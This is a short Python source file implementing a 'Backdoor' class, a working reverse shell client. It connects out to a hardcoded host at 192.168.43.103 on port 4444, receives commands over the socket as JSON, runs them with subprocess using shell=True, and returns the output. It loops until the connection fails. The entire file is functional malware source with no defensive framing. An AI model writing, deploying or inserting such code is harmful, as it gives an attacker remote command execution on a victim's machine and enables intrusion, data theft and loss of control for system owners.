import socket
import subprocess
import json


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data.decode())
        self.connection.send(json_data.encode())

    def reliable_recieve(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def run(self):
        try:
            while True:
                command = self.reliable_recieve()
                cmd_result = self.execute_system_command(command)
                self.reliable_send(cmd_result)
        except:
            self.connection.close()
            print("[-] Connection Lost")


backdoor = Backdoor("192.168.43.103", 4444)
backdoor.run()